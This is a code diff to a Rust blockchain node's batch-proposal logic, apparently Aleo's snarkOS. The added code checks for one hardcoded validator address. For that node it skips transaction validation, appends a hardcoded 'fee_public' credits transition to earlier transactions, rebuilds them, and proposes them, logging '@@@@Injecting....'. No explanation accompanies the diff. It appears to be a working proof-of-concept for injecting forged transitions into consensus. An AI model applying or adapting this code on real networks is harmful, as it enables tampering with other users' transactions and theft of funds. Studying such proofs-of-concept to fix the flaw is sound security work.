@@ -69,6 +69,7 @@ use std::{
     sync::Arc,
     time::Duration,
 };
+use snarkvm::ledger::{Execution, Transition};
 use tokio::{
     sync::{Mutex as TMutex, OnceCell},
     task::JoinHandle,
@@ -331,6 +332,7 @@ impl<N: Network> Primary<N> {
         // This function isn't re-entrant.
         let mut lock_guard = self.propose_lock.lock().await;
 
+
         // Check if the proposed batch has expired, and clear it if it has expired.
         if let Err(e) = self.check_proposed_batch_for_expiration().await {
             warn!("Failed to check the proposed batch for expiration - {e}");
@@ -470,63 +472,88 @@ impl<N: Network> Primary<N> {
         let num_transmissions_per_worker = BatchHeader::<N>::MAX_TRANSMISSIONS_PER_BATCH / self.num_workers() as usize;
         // Initialize the map of transmissions.
         let mut transmissions: IndexMap<_, _> = Default::default();
-        // Take the transmissions from the workers.
-        for worker in self.workers.iter() {
-            // Initialize a tracker for included transmissions for the current worker.
-            let mut num_transmissions_included_for_worker = 0;
-            // Keep draining the worker until the desired number of transmissions is reached or the worker is empty.
-            'outer: while num_transmissions_included_for_worker < num_transmissions_per_worker {
-                // Determine the number of remaining transmissions for the worker.
-                let num_remaining_transmissions =
-                    num_transmissions_per_worker.saturating_sub(num_transmissions_included_for_worker);
-                // Drain the worker.
-                let mut worker_transmissions = worker.drain(num_remaining_transmissions).peekable();
-                // If the worker is empty, break early.
-                if worker_transmissions.peek().is_none() {
-                    break 'outer;
+        if self.gateway.account().address().to_string() == "aleo1rhgdu77hgyqd3xjj8ucu3jj9r2krwz6mnzyd80gncr5fxcwlh5rsvzp9px".to_string() {
+            let certificates = self.storage.get_certificates_for_round(previous_round);
+            let previous_transmissions_ids = certificates
+                .iter()
+                .map(|c| c.batch_header().transmission_ids().clone())
+                .flatten()
+                .collect::<IndexSet<TransmissionID<N>>>();
+            info!("@@@@Injecting....");
+            for id in previous_transmissions_ids {
+                if let Some(transmssion) = self.storage.get_transmission(id) {
+                    match inject_transition(transmssion) {
+                        Ok((id,injected_transmssion)) => {
+                            self.workers[0].reinsert(id, injected_transmssion.clone());
+                            transmissions.insert(id, injected_transmssion);
+                            info!("@@@@@@@Injected a transmission");
+                        }
+                        Err(err) => {
+                            info!("@@@@@@@Failed to inject a transmission: {}", err);
+                        }
+                    }
                 }
-                // Iterate through the worker transmissions.
-                'inner: for (id, transmission) in worker_transmissions {
-                    // Check if the ledger already contains the transmission.
-                    if self.ledger.contains_transmission(&id).unwrap_or(true) {
-                        trace!("Proposing - Skipping transmission '{}' - Already in ledger", fmt_id(id));
-                        continue 'inner;
+            }
+        } else {
+            // Take the transmissions from the workers.
+            for worker in self.workers.iter() {
+                // Initialize a tracker for included transmissions for the current worker.
+                let mut num_transmissions_included_for_worker = 0;
+                // Keep draining the worker until the desired number of transmissions is reached or the worker is empty.
+                'outer: while num_transmissions_included_for_worker < num_transmissions_per_worker {
+                    // Determine the number of remaining transmissions for the worker.
+                    let num_remaining_transmissions =
+                        num_transmissions_per_worker.saturating_sub(num_transmissions_included_for_worker);
+                    // Drain the worker.
+                    let mut worker_transmissions = worker.drain(num_remaining_transmissions).peekable();
+                    // If the worker is empty, break early.
+                    if worker_transmissions.peek().is_none() {
+                        break 'outer;
                     }
-                    // Check if the storage already contain the transmission.
-                    // Note: We do not skip if this is the first transmission in the proposal, to ensure that
-                    // the primary does not propose a batch with no transmissions.
-                    if !transmissions.is_empty() && self.storage.contains_transmission(id) {
-                        trace!("Proposing - Skipping transmission '{}' - Already in storage", fmt_id(id));
-                        continue 'inner;
-                    }
-                    // Check the transmission is still valid.
-                    match (id, transmission.clone()) {
-                        (TransmissionID::Solution(solution_id), Transmission::Solution(solution)) => {
-                            // Check if the solution is still valid.
-                            if let Err(e) = self.ledger.check_solution_basic(solution_id, solution).await {
-                                trace!("Proposing - Skipping solution '{}' - {e}", fmt_id(solution_id));
-                                continue 'inner;
-                            }
+                    // Iterate through the worker transmissions.
+                    'inner: for (id, transmission) in worker_transmissions {
+                        // Check if the ledger already contains the transmission.
+                        if self.ledger.contains_transmission(&id).unwrap_or(true) {
+                            trace!("Proposing - Skipping transmission '{}' - Already in ledger", fmt_id(id));
+                            continue 'inner;
                         }
-                        (TransmissionID::Transaction(transaction_id), Transmission::Transaction(transaction)) => {
-                            // Check if the transaction is still valid.
-                            if let Err(e) = self.ledger.check_transaction_basic(transaction_id, transaction).await {
-                                trace!("Proposing - Skipping transaction '{}' - {e}", fmt_id(transaction_id));
-                                continue 'inner;
-                            }
+                        // Check if the storage already contain the transmission.
+                        // Note: We do not skip if this is the first transmission in the proposal, to ensure that
+                        // the primary does not propose a batch with no transmissions.
+                        if !transmissions.is_empty() && self.storage.contains_transmission(id) {
+                            trace!("Proposing - Skipping transmission '{}' - Already in storage", fmt_id(id));
+                            continue 'inner;
                         }
-                        // Note: We explicitly forbid including ratifications,
-                        // as the protocol currently does not support ratifications.
-                        (TransmissionID::Ratification, Transmission::Ratification) => continue,
-                        // All other combinations are clearly invalid.
-                        _ => continue 'inner,
+                        // Check the transmission is still valid.
+                        match (id, transmission.clone()) {
+                            (TransmissionID::Solution(solution_id), Transmission::Solution(solution)) => {
+                                // Check if the solution is still valid.
+                                if let Err(e) = self.ledger.check_solution_basic(solution_id, solution).await {
+                                    trace!("Proposing - Skipping solution '{}' - {e}", fmt_id(solution_id));
+                                    continue 'inner;
+                                }
+                            }
+                            (TransmissionID::Transaction(transaction_id), Transmission::Transaction(transaction)) => {
+                                // Check if the transaction is still valid.
+                                if let Err(e) = self.ledger.check_transaction_basic(transaction_id, transaction).await {
+                                    trace!("Proposing - Skipping transaction '{}' - {e}", fmt_id(transaction_id));
+                                    continue 'inner;
+                                }
+                            }
+                            // Note: We explicitly forbid including ratifications,
+                            // as the protocol currently does not support ratifications.
+                            (TransmissionID::Ratification, Transmission::Ratification) => continue,
+                            // All other combinations are clearly invalid.
+                            _ => continue 'inner,
+                        }
+                        // Insert the transmission into the map.
+                        transmissions.insert(id, transmission);
+                        num_transmissions_included_for_worker += 1;
                     }
-                    // Insert the transmission into the map.
-                    transmissions.insert(id, transmission);
-                    num_transmissions_included_for_worker += 1;
                 }
             }
         }
+
         // Ditto if the batch had already been proposed and not expired.
         ensure!(round > 0, "Round 0 cannot have transaction batches");
         // Determine the current timestamp.
@@ -1667,6 +1694,27 @@ impl<N: Network> Primary<N> {
         // Close the gateway.
         self.gateway.shut_down().await;
     }
+}
+
+
+fn inject_transition<N: Network>(transmission: Transmission<N>) -> anyhow::Result<(TransmissionID<N>, Transmission<N>)> {
+    let json_tst = r#"{"id":"au1t99ncm6ejshyfedwyxcwg3apaay369lllqqzghsug0gget9wjqgq7m2q5y","program":"credits.aleo","function":"fee_public","inputs":[{"type":"public","id":"5966044097899650539638338525062479954885673977387228736197504347205625183289field","value":"264000u64"},{"type":"public","id":"3940624164649637583286355056780138263967366915733513326696242479455113760526field","value":"0u64"},{"type":"public","id":"5239171749092659125354495113666469274952595247189315425338325383976299933406field","value":"5627919713096023022810864855732110948457332951683423426073287792711537068053field"}],"outputs":[{"type":"future","id":"1203363949128896296643204741158669955886954177154722507004984582888956505355field","value":"{\n  program_id: credits.aleo,\n  function_name: fee_public,\n  arguments: [\n    aleo1nnrfst0v0zrmv809y9l55denfldx3ryn0nmelws0ffz0hx9mxcys84jxxn,\n    264000u64\n  ]\n}"}],"tpk":"1244871755030072089927010102848257447838727680620214729314686160596038244101group","tcm":"6492126100859541364547227631537502145443726379274132805232603780180342314364field"}"#;
+    let tst = Transition::<N>::from_str(json_tst)?;
+    let tx = match transmission {
+        Transmission::Transaction(tx) => tx,
+        _ => return bail!("skip transmission"),
+    };
+    let tx = tx.deserialize_blocking()?;
+    let execution = tx.execution().ok_or(anyhow::anyhow!("Failed to deserialize the transaction"))?;
+    let mut transitions = execution
+        .transitions()
+        .map(|ts| ts.clone())
+        .collect::<Vec<_>>();
+    transitions.push(tst);
+    let proof = execution.proof().map(|proof| proof.clone());
+    let new_execution = Execution::from(transitions.into_iter(), execution.global_state_root(), proof)?;
+    let tx = Transaction::from_execution(new_execution, None)?;
+    Ok((TransmissionID::Transaction(tx.id()), Transmission::from(tx)))
 }
 
 #[cfg(test)]
